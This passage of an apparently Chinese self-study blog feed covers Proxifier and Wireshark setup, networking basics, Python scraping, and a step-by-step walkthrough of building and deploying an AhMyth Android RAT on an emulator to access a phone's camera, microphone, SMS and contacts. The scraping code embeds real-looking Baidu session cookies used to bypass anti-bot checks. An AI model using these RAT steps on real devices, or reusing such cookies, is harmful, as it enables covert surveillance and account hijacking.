    <content type="html"><![CDATA[<h4 id="一，Proxifier的使用"><a href="#一，Proxifier的使用" class="headerlink" title="一，Proxifier的使用"></a>一，Proxifier的使用</h4><p>​Proxifier是一款功能非常强大的socks5客户端，可以让不支持通过代理服务器工作的网络程序能通过HTTPS或SOCKS代理或代理链。</p><p>1，下载安装Proxifier，官网地址为：<a href="https://www.proxifier.com/">https://www.proxifier.com/</a></p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312051933548.png" alt="image-20231205193345581" style="zoom: 80%;" /><p>2，双击运行Proxifier</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312051936640.png" alt="image-20231205193621432"></p><p>3，点击配置文件—&gt;点击代理服务器—&gt;点击添加—&gt;地址填127.0.0.1—&gt;端口填自己代理的端口—&gt;选中SOCKES 版本 5—&gt;点击确定—&gt;点击确定</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312051940358.png" alt="image-20231205194010239"></p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312051941649.png" alt="image-20231205194102379"></p><p>4，点击配置文件—&gt;点击代理规则—&gt;点击添加—&gt;名称随意填—&gt;应用程序填想要添加代理的程序或服务，例如：ssh*;—&gt;点击确定—&gt;移除Location—&gt;将Default的最后一格改为Direct—&gt;点击确定</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312051944093.png" alt="image-20231205194430704"></p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312051946528.png" alt="image-20231205194615312"></p><p>5，打开命令提示符，输入：ssh <a href="mailto:&#x72;&#x6f;&#x6f;&#x74;&#64;&#49;&#x2e;&#49;&#x2e;&#x31;&#x2e;&#x31;">&#x72;&#x6f;&#x6f;&#x74;&#64;&#49;&#x2e;&#49;&#x2e;&#x31;&#x2e;&#x31;</a>，返回Proxifier出现以下效果，说明代理成功</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312051950439.png" alt="image-20231205195024403"></p><h4 id="二，Wireshark的使用"><a href="#二，Wireshark的使用" class="headerlink" title="二，Wireshark的使用"></a>二，Wireshark的使用</h4><p>​WireShark是非常流行的网络封包分析工具，可以截取各种网络数据包，并显示数据包详细信息。常用于开发测试过程中各种问题定位。</p><p>1，下载WireShark，官网地址为：<a href="https://www.wireshark.org/">https://www.wireshark.org/</a></p><p>下载时能勾上下载的插件全部都要勾上下载下来，包括其中的Npcap和USBPcap组件</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312051956891.png" alt="image-20231205195616935"></p><p>2，找到本机的网卡并双击选择</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312051958979.png" alt="image-20231205195830437"></p><p>3，打开命令提示符，输入ping 192.168.2.56,发送和接收四个数据包</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312052000693.png" alt="image-20231205200010210"></p><p>4，在WireShark中点击停止，停止监控数据包</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312052001054.png" alt="image-20231205200123126"></p><p>5，在搜索框中输入icmp，查看ping的数据包</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312052002568.png" alt="image-20231205200251634"></p><p>6.，在搜索框中输入ip.src&#x3D;&#x3D;192.168.2.96则可以查看源地址为192.168.2.96的数据包</p><p>输入ip.dst&#x3D;&#x3D;192.168.2.56则可以查看目标地址为192.168.2.56的数据包</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312052008367.png" alt="image-20231205200848249"></p><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;一，Proxifier的使用&quot;&gt;&lt;a href=&quot;#一，Proxifier的使用&quot; class=&quot;headerlink&quot; title=&quot;一，Proxifier的使用&quot;&gt;&lt;/a&gt;一，Proxifier的使用&lt;/h4&gt;&lt;p&gt;​		Proxifier是一款功能非常强大的</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>二十三，网络基础</title>
    <link href="http://example.com/2023/12/04/%E4%BA%8C%E5%8D%81%E4%B8%89%EF%BC%8C%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/"/>
    <id>http://example.com/2023/12/04/%E4%BA%8C%E5%8D%81%E4%B8%89%EF%BC%8C%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/</id>
    <published>2023-12-04T11:54:11.000Z</published>
    <updated>2023-12-10T07:32:44.616Z</updated>
    
    <content type="html"><![CDATA[<h4 id="1，正向shell和反弹shell"><a href="#1，正向shell和反弹shell" class="headerlink" title="1，正向shell和反弹shell"></a>1，正向shell和反弹shell</h4><p>​正向shell是指攻击者在目标主机上成功安装了一个后门程序，使其能够通过网络与目标主机进行远程通信和控制。攻击者可以通过正向shell执行各种操作，如上传、下载、修改文件、执行命令等。</p><p>​反弹shell是指攻击者通过在目标主机上成功执行一个恶意代码，然后利用该恶意代码与自己的主机建立连接，从而实现对目标主机的远程控制。攻击者可以利用反弹shell执行各种攻击，如窃取敏感信息、操纵目标主机等。</p><p>示意图如下：<br><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312042011102.png" alt="image-20231204201149825" style="zoom:67%;" /></p><h4 id="2，ipv4的组成："><a href="#2，ipv4的组成：" class="headerlink" title="2，ipv4的组成："></a>2，ipv4的组成：</h4><p>网络部分（NETWORK）+主机部分（HOST）</p><p>比如：        192.168.1.142</p><p>网络部分为[192.168.1]    主机部分[142]</p><p>问：255.255.255.255&#x2F;30有多少个可分配的主机地址，分别是什么，其他的为什么不可用</p><p>答：对于IP地址块255.255.255.255&#x2F;30，它是一个包含4个连续IP地址的子网。</p><p>其中，两个IP地址是网络地址和广播地址，不能用于分配给主机。剩下的两个IP地址可用于分配给主机。</p><p>具体地，该子网的可分配的主机地址为：</p><pre><code>网络地址：255.255.255.252 (不可用)第一个可用主机地址：255.255.255.253第二个可用主机地址：255.255.255.254广播地址：255.255.255.255 (不可用)</code></pre><p>其中，网络地址和广播地址是保留地址，不能用于主机的分配。而第一个可用主机地址和第二个可用主机地址可以用于分配给主机使用。</p><p>需要注意的是，&#x2F;30 子网掩码只允许分配两个可用主机地址，因为它使用了30位来标识网络，只留下了2个位用于主机地址。</p><h4 id="3，公网地址和私网地址："><a href="#3，公网地址和私网地址：" class="headerlink" title="3，公网地址和私网地址："></a>3，公网地址和私网地址：</h4><p>公有网络地址分为A，B，C，D，E五类</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312042019152.png" alt="image-20231204201908897"></p><p>其中A，B，C三类为常用地址，D类地址用于组播通信的地址，E类地址用于科学研究的保留地址</p><p>私有网络地址分为A，B，C三类</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312042020772.png" alt="image-20231204202045734"></p><h4 id="4，OSI模型"><a href="#4，OSI模型" class="headerlink" title="4，OSI模型"></a>4，OSI模型</h4><p>​OSI（Open System Interconnect），即开放式系统互连。该体系结构标准定义了网络互连的七层框架</p><p>​OSI是逻辑模型，而非物理模型，它是一组指导原则，开发人员可据此来开发网络中运行的应用程序，它还提供了一个框架，可用于指导如何制作和实施网络标准，如何制造设备以及如何制定网络互联档案。</p><p>参考模型的优点：</p><ul><li>将网络通信过程划分成更小，更简单的组件，这有助于组件的开发，设计和故障排除。</li><li>通过标准化网络部件，让多家厂商能够协作开发。</li><li>明确定义了模型每层执行的功能，从而支持行业标准化。</li><li>让不同类型的网络硬件和软件能够彼此通信。</li><li>防止对一层的修改影响其他层，从而避免了开发工作的影响。</li></ul><p>OSI七层架构及各层作用：</p><p>物理层（Physical Layer）：负责传输比特流，并管理物理连接、电压等物理特性。<br>数据链路层（Data Link Layer）：在相邻节点之间传输数据帧，并提供错误检测和纠正的功能。<br>网络层（Network Layer）：负责在网络中选择路由并转发数据包，例如IP协议。<br>传输层（Transport Layer）：提供端到端的数据传输服务，并确保数据的可靠性和完整性，例如TCP协议。<br>会话层（Session Layer）：管理通信会话的建立、维护和终止。<br>表示层（Presentation Layer）：负责数据的格式化、加密和解密，以确保不同系统之间的数据交换。<br>应用层（Application Layer）：提供特定应用程序的服务，例如HTTP、FTP、SMTP等。</p><h4 id="5，路由器"><a href="#5，路由器" class="headerlink" title="5，路由器"></a>5，路由器</h4><p>路由器的定义：是实现网络互连设备，工作在网络层<br>路由器的功能：路由和转发<br>1）可以决定数据包从来源端到目的端所经过的路由路径（host到host之间的最佳传输路径），这个过程称为路由；<br>2）将路由器输入端的数据包移送至适当的路由器输出端（在路由器内部进行），这称为转发。<br>路由器和交换机的区别？<br>交换机是查看MAC地址表的，路由器是查看路由表的。交换机如果没有在MAC地址表中找到自己想要的，它就要进行区域泛洪，而路由器如果在路由表中找不到对应的条目会直接丢弃数据包，并返回一个不可到达的信息。他不会发送广播，所以路由器有隔离广播域的功能而交换机所在的网络内部就是一个广播域，他只在本区域泛洪，不会泛红到路由器外面；且交换机工作在二层，根据MAC地址表转发数据帧，路由器工作在三层，根据路由表转发数据包，交换机一般工作在据域网内，而路由器工作在广域网。</p><p>内网从路由器获取ip地址分为静态自动和动态（dhcp）手动两种<br>动态获取的ip在电脑关机时回收，下次启用时重新分发<br>当静动态都设为同一ip时，能不能上网和路由器的优先有关，一般时静态优先</p><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;1，正向shell和反弹shell&quot;&gt;&lt;a href=&quot;#1，正向shell和反弹shell&quot; class=&quot;headerlink&quot; title=&quot;1，正向shell和反弹shell&quot;&gt;&lt;/a&gt;1，正向shell和反弹shell&lt;/h4&gt;&lt;p&gt;​		正向shell</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>二十二，安卓手机远控AhMyth</title>
    <link href="http://example.com/2023/12/04/%E4%BA%8C%E5%8D%81%E4%BA%8C%EF%BC%8C%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E8%BF%9C%E6%8E%A7AhMyth/"/>
    <id>http://example.com/2023/12/04/%E4%BA%8C%E5%8D%81%E4%BA%8C%EF%BC%8C%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E8%BF%9C%E6%8E%A7AhMyth/</id>
    <published>2023-12-04T11:12:59.000Z</published>
    <updated>2023-12-04T11:47:00.739Z</updated>
    
    <content type="html"><![CDATA[<p>AhMyth是一款在GitHub上开源的能控制安卓手机的远程控制软件</p><p>项目地址为：<a href="https://github.com/AhMyth/AhMyth-Android-RAT">https://github.com/AhMyth/AhMyth-Android-RAT</a></p><p>接下来进行进行控制操作：</p><p>1，下载好AhMyth双击打开</p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312041921484.png" alt="image-20231204192128499" style="zoom:67%;" /><p>2，点击APK Builder—&gt;在Source IP中输入本机的IP地址—&gt;Source Port可以不用填，默认端口—&gt;点击Builder生成apk木马</p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312041929465.png" alt="image-20231204192953991" style="zoom:67%;" /><p>3，根据生成的地址找到apk木马</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312041931824.png" alt="image-20231204193145510"></p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312041933275.png" alt="image-20231204193317929"></p><p>4，在AhMyth中点击Victims，再点击Listen开启监听</p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312041936924.png" alt="image-20231204193640437" style="zoom:67%;" /><p>5，打开手机模拟器，将生成的Ahmyth.s.apk拖到模拟器中，双击运行，返回Ahmyth若出现以下效果，则证明远控成功</p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312041938350.png" alt="image-20231204193832219" style="zoom:67%;" /><p>6，点击Open The Lab可打开操作面板</p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312041939082.png" alt="image-20231204193948018" style="zoom:67%;" /><p>7，其中各个按钮皆有不同的功能</p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312041945549.png" alt="image-20231204194534288" style="zoom:67%;" /><p>Camera:开启手机的前置或后置摄像头进行拍照</p><p>File Manager:文件管理器</p><p>Mic:可开启麦克风进行录音</p><p>Location:地址定位功能</p><p>contacts:通讯录</p><p>SMS:发送短信</p><p>Calls Logs:查看通话记录</p><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;AhMyth是一款在GitHub上开源的能控制安卓手机的远程控制软件&lt;/p&gt;
&lt;p&gt;项目地址为：&lt;a href=&quot;https://github.com/AhMyth/AhMyth-Android-RAT&quot;&gt;https://github.com/AhMyth/AhMyth-A</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>二十一，python爬虫基础</title>
    <link href="http://example.com/2023/12/03/%E4%BA%8C%E5%8D%81%E4%B8%80%EF%BC%8Cpython%E7%88%AC%E8%99%AB%E5%9F%BA%E7%A1%80/"/>
    <id>http://example.com/2023/12/03/%E4%BA%8C%E5%8D%81%E4%B8%80%EF%BC%8Cpython%E7%88%AC%E8%99%AB%E5%9F%BA%E7%A1%80/</id>
    <published>2023-12-03T03:15:18.000Z</published>
    <updated>2023-12-03T06:24:58.758Z</updated>
    
    <content type="html"><![CDATA[<h5 id="爬虫概念：使用程序模拟浏览器，向服务器发送请求，获取响应数据"><a href="#爬虫概念：使用程序模拟浏览器，向服务器发送请求，获取响应数据" class="headerlink" title="爬虫概念：使用程序模拟浏览器，向服务器发送请求，获取响应数据"></a>爬虫概念：使用程序模拟浏览器，向服务器发送请求，获取响应数据</h5><p>通过国内镜像地址下载urllib包：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install urllib -i https://mirrors.huaweicloud.com/pypi/simple/</span><br></pre></td></tr></table></figure><h5 id="第一个爬虫程序："><a href="#第一个爬虫程序：" class="headerlink" title="第一个爬虫程序："></a>第一个爬虫程序：</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入urllib包</span></span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="comment"># 定义访问的地址</span></span><br><span class="line">url=<span class="string">&quot;http://www.baidu.com&quot;</span></span><br><span class="line"><span class="comment"># 模拟浏览器向服务器发送请求，获取response响应</span></span><br><span class="line">response=urllib.request.urlopen(url)</span><br><span class="line"><span class="comment"># 获取响应中的页面源码，并设置utf-8编码</span></span><br><span class="line">connest=response.read().decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="comment"># 打印页面源码</span></span><br><span class="line"><span class="built_in">print</span>(connest)</span><br></pre></td></tr></table></figure><h5 id="其中read方法可以用其他方法替换："><a href="#其中read方法可以用其他方法替换：" class="headerlink" title="其中read方法可以用其他方法替换："></a>其中read方法可以用其他方法替换：</h5><p>read()一个字节一个字节的读</p><p>readline()读取一行</p><p>readlines()读取所有行</p><p>getcode()获取状态码</p><p>geturl()获取URL地址</p><p>getheaders()获取状态信息</p><h5 id="urllib下载数据"><a href="#urllib下载数据" class="headerlink" title="urllib下载数据"></a>urllib下载数据</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url1=&quot;http://www.baidu.com&quot;</span><br><span class="line">urllib.request.urlretrieve(url1,&#x27;baidu.html&#x27;)</span><br></pre></td></tr></table></figure><p>其中url1可以设置页面，图片，视频的地址</p><h5 id="UA反爬"><a href="#UA反爬" class="headerlink" title="UA反爬"></a>UA反爬</h5><p>有些网页具有UA反爬设置，可以在程序中设置headers进行防反爬</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">header=&#123;</span><br><span class="line">    &#x27;User-Agent&#x27;:&#x27; Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 SLBrowser/9.0.0.10191 SLBChan/11&#x27;</span><br><span class="line">&#125;</span><br><span class="line">request=urllib.request.Request(url=url,headers=header)</span><br><span class="line">response=urllib.request.urlopen(request)</span><br><span class="line">conest=response.read().decode(&#x27;utf-8&#x27;)</span><br></pre></td></tr></table></figure><p>其中header的内容可以在浏览器中的控制台–&gt;Network–&gt;all–&gt;Name中选择数据–&gt;Headers–&gt;Request Headers</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312031133372.png" alt="image-20231203113331061"></p><h5 id="get请求的quote方法"><a href="#get请求的quote方法" class="headerlink" title="get请求的quote方法"></a>get请求的quote方法</h5><p>当get请求的参数是中文时，要将之转化为浏览器可以识别的参数，就需要用要quote方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url=&#x27;https://www.baidu.com/s?wd=&#x27;</span><br><span class="line">name=urllib.parse.quote(&#x27;猫&#x27;)</span><br><span class="line">url=url+name</span><br></pre></td></tr></table></figure><h5 id="绕过百度安全验证"><a href="#绕过百度安全验证" class="headerlink" title="绕过百度安全验证"></a>绕过百度安全验证</h5><p>当用爬虫爬取百度搜索的数据时，可能会遇到百度安全验证的问题，可以在headers中设置User-Agent，Cookie和Accept来绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">header = &#123;</span><br><span class="line">    &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36 Edg/83.0.478.50&#x27;,</span><br><span class="line">    &#x27;Cookie&#x27;:&#x27;BDUSS_BFESS=HJlUk1lRmhpV0NQY090SXVrWUpHYVBLMDJyN0trbG5TUnBZdHB4QmsyT3pqZzlsSVFBQUFBJCQAAAAAAQAAAAEAAAAs7BUgZGZnZ2dnZmZmdGcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALMB6GSzAehke; H_WISE_SIDS_BFESS=39635_39647_39664_39676_39713_39733_39740_39780_39703_39684_39661_39679_39841; BAIDUID_BFESS=5F6D6603BD12746091D57F3B00271E14:FG=1; ZFY=EIjY8scX6onNHxN7L0gc:AlgR2fdPGOCkedx3Wllh2uw:C&#x27;,#自己先在浏览器登录百度账号</span><br><span class="line">    &#x27;Accept&#x27;:&#x27;image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8&#x27;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="post请求"><a href="#post请求" class="headerlink" title="post请求"></a>post请求</h5><p>post请求与get请求方式不同，请求参数不是拼接的形式，要对请求参数进行处理，再定制请求</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">data=&#123;</span><br><span class="line">    &#x27;kw&#x27;:&#x27;so&#x27;</span><br><span class="line">&#125;</span><br><span class="line"># post请求的参数必须要进行编码</span><br><span class="line">data=urllib.parse.urlencode(data).encode(&#x27;utf-8&#x27;)</span><br><span class="line">request=urllib.request.Request(url=url,headers=header,data=data)</span><br></pre></td></tr></table></figure><h5 id="将str类型变为json对象"><a href="#将str类型变为json对象" class="headerlink" title="将str类型变为json对象"></a>将str类型变为json对象</h5><p>先导入json包，后使用loads方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import json</span><br><span class="line">obi=json.loads(contect)</span><br></pre></td></tr></table></figure><h5 id="get请求豆瓣电影，保存数据为json文件"><a href="#get请求豆瓣电影，保存数据为json文件" class="headerlink" title="get请求豆瓣电影，保存数据为json文件"></a>get请求豆瓣电影，保存数据为json文件</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># @Describe:get请求豆瓣电影，保存前10页数据</span></span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_request</span>(<span class="params">page</span>):</span><br><span class="line">    base_url =<span class="string">&#x27;https://movie.douban.com/j/chart/top_list?type=24&amp;interval_id=100%3A90&amp;action=&amp;&#x27;</span></span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">&#x27;start&#x27;</span>:(page-<span class="number">1</span>)*<span class="number">20</span>,</span><br><span class="line">        <span class="string">&#x27;limit&#x27;</span>:<span class="number">20</span></span><br><span class="line">    &#125;</span><br><span class="line">    data=urllib.parse.urlencode(data)</span><br><span class="line">    url=base_url+data</span><br><span class="line">    <span class="built_in">print</span>(url)</span><br><span class="line">    header=&#123;</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;application/json, text/javascript, */*; q=0.01&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;BIDUPSID=4722B19FFA1551DBBC67EFB7A68BF304; PSTM=1654602249; REALTIME_TRANS_SWITCH=1; FANYI_WORD_SWITCH=1; HISTORY_SWITCH=1; SOUND_SPD_SWITCH=1; SOUND_PREFER_SWITCH=1; MCITY=-261%3A318%3A; BAIDUID=5F6D6603BD12746091D57F3B00271E14:FG=1; BDUSS=HJlUk1lRmhpV0NQY090SXVrWUpHYVBLMDJyN0trbG5TUnBZdHB4QmsyT3pqZzlsSVFBQUFBJCQAAAAAAQAAAAEAAAAs7BUgZGZnZ2dnZmZmdGcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALMB6GSzAehke; BDUSS_BFESS=HJlUk1lRmhpV0NQY090SXVrWUpHYVBLMDJyN0trbG5TUnBZdHB4QmsyT3pqZzlsSVFBQUFBJCQAAAAAAQAAAAEAAAAs7BUgZGZnZ2dnZmZmdGcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALMB6GSzAehke; APPGUIDE_10_6_5=1; APPGUIDE_10_6_6=1; APPGUIDE_10_6_7=1; newlogin=1; APPGUIDE_10_6_9=1; H_WISE_SIDS=39635_39647_39664_39676_39713_39733_39740_39780_39703_39684_39661_39679_39841; H_PS_PSSID=39635_39647_39664_39676_39713_39733_39740_39780_39703_39684_39661_39679_39841; H_WISE_SIDS_BFESS=39635_39647_39664_39676_39713_39733_39740_39780_39703_39684_39661_39679_39841; BDORZ=FFFB88E999055A3F8A630C64834BD6D0; BAIDUID_BFESS=5F6D6603BD12746091D57F3B00271E14:FG=1; Hm_lvt_64ecd82404c51e03dc91cb9e8c025574=1701173106,1701241794,1701248955,1701307912; Hm_lpvt_64ecd82404c51e03dc91cb9e8c025574=1701307912; ab_sr=1.0.1_MjMxMmVhNDhhZjY3NDU1ODI4OWQ5MjlmZjZkN2VhN2M3MDJkYzdhMGE4OTFlOWY3Y2I0ZDhiZjViYmRhNDgyMjk4NGM5MTVkYzI4MTg1N2U3MTlhODI0MGZkYmFkOGQ3Y2Y4MGQ3ZDdhZjU3MTgwMTE2MzUyMWQ1YTNjOGUzZDI0NTY0MzJjZjFjMDhhOGUxMTYyODIwZDQ1NGE2MmRiNWY3OGRmNTQ4OWQ4ODM0NDk0NTI0NDhkZTRjNThkYTQ2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 SLBrowser/9.0.0.10191 SLBChan/11&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    request=urllib.request.Request(url=url,headers=header)</span><br><span class="line">    <span class="keyword">return</span> request</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_contect</span>(<span class="params">request</span>):</span><br><span class="line">    response=urllib.request.urlopen(request)</span><br><span class="line">    contect=response.read().decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> contect</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">down_load</span>(<span class="params">page,contect</span>):</span><br><span class="line">    json_name=<span class="string">&#x27;./doban/doban&#x27;</span>+<span class="built_in">str</span>(page)+<span class="string">&#x27;.json&#x27;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(json_name,<span class="string">&#x27;w&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        fp.write(contect)</span><br><span class="line">    fp.close()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 程序入口</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    start_page=<span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;请融入起始页：&quot;</span>))</span><br><span class="line">    end_page=<span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入结尾页：&quot;</span>))</span><br><span class="line">    <span class="keyword">if</span>(start_page&lt;<span class="number">1</span> <span class="keyword">or</span> end_page&lt;start_page):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;输入错误！&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> page <span class="keyword">in</span> <span class="built_in">range</span>(start_page, end_page+<span class="number">1</span>):</span><br><span class="line">            request=get_request(page)</span><br><span class="line">            contect=get_contect(request)</span><br><span class="line">            down_load(page,contect)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;下载豆瓣电影名称&quot;</span>+<span class="built_in">str</span>(start_page)+<span class="string">&quot;~&quot;</span>+<span class="built_in">str</span>(end_page)+<span class="string">&quot;页完成！&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>第33行作用：当当前脚本被直接运行时，执行下面的代码块；当当前脚本被导入到其他脚本中时，不执行下面的代码块。这种写法通常用于确保某个模块或脚本在作为主程序运行时才执行某些操作，而在被导入时不执行这些操作。</p><p>第10行作用：将data中的属性值以&amp;连接起来</p><h5 id="post请求KFC，保存前10页数据"><a href="#post请求KFC，保存前10页数据" class="headerlink" title="post请求KFC，保存前10页数据"></a>post请求KFC，保存前10页数据</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"># @Describe:post请求KFC，保存前10页数据</span><br><span class="line"></span><br><span class="line">import urllib.parse</span><br><span class="line">import urllib.request</span><br><span class="line"></span><br><span class="line">def get_request(page):</span><br><span class="line">    url =&#x27;http://www.kfc.com.cn/kfccda/ashx/GetStoreList.ashx?op=cname&#x27;</span><br><span class="line">    data=&#123;</span><br><span class="line">        &#x27;cname&#x27;: &#x27;北京&#x27;,</span><br><span class="line">        